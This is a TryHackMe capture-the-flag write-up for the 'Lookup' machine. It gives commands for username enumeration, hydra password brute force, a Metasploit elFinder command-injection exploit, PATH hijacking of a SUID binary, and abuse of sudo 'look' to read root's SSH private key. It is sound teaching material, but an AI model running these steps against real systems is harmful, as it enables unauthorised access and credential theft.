# Lookup - TryHackMe

Linux machine with a login form vulnerable to username enumeration, a file manager running a vulnerable elFinder version, and a two-stage privilege escalation combining PATH hijacking and a sudo `look` misconfiguration. The attack moves from username discovery to brute force, to RCE, to PATH abuse, to SSH key exfiltration.

---

## Enumeration

### Network Scanning

```bash
rustscan -a <target_ip>
nmap -sC -sV <target_ip>
```

Open ports:

- 22/tcp - SSH
- 80/tcp - HTTP

Add the machine hostname to `/etc/hosts` before proceeding.

### Username Enumeration via Login Form

The login page returned different error messages for an invalid username versus a valid username with the wrong password. This allowed enumeration without brute force:

- `admin` confirmed as a valid user
- `jose` identified through a targeted script against the login endpoint

### Credential Brute Force

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=<error message>"
```

Valid credentials for `jose` recovered.

After logging in, a subdomain was discovered. Added to `/etc/hosts` and enumerated. The subdomain hosted a file manager application.

---

## Initial Access

### elFinder PHP Connector - Command Injection

The file manager was identified as elFinder. Version detected via the interface. Searched for known exploits:

```bash
searchsploit elfinder
```

Exploit: elFinder PHP connector command injection via `exiftran`.

```bash
msfconsole
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS <target_ip>
set VHOST <subdomain>
run
```

Shell obtained as `www-data`.

---

## Privilege Escalation

### PATH Hijacking - www-data to think

Local enumeration revealed a SUID binary at `/usr/sbin/pwm`. The binary called `id` without a full path - vulnerable to PATH hijacking.

Created a fake `id` binary in `/tmp` and prepended it to `PATH`:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

The manipulated output revealed password material for user `think`. Used the recovered credentials to SSH in as `think`.

### sudo look - think to root

```bash
sudo -l
```

`think` could run `/usr/bin/look` as root without a password. `look` prints lines from a file that begin with a given prefix - when the prefix is empty, it reads the entire file:

```bash
sudo look "" /root/.ssh/id_rsa
```

The root SSH private key printed to stdout. Saved locally:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@<target_ip>
```

---

## Flags

```
user.txt  -> /home/think/user.txt
root.txt  -> /root/root.txt
```

---

## Key Takeaways

- Login forms returning different errors for valid/invalid usernames enable username enumeration without brute force. This is a well-known, persistently common misconfiguration.
- After gaining a web shell, enumerate virtual hosts and subdomains. They often host separate applications with their own attack surfaces.
- SUID binaries that call programs by name rather than full path are PATH hijacking candidates. Identify the called program, place a fake binary in `/tmp`, and prepend `/tmp` to `PATH`.
- `sudo look` with an empty prefix reads any file as root. Any `sudo`-permitted binary that reads files is a credential exfiltration primitive - SSH keys are the highest-value target.
- Chaining multiple low-privilege steps (www-data to think to root) is more realistic than finding a single direct root exploit.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
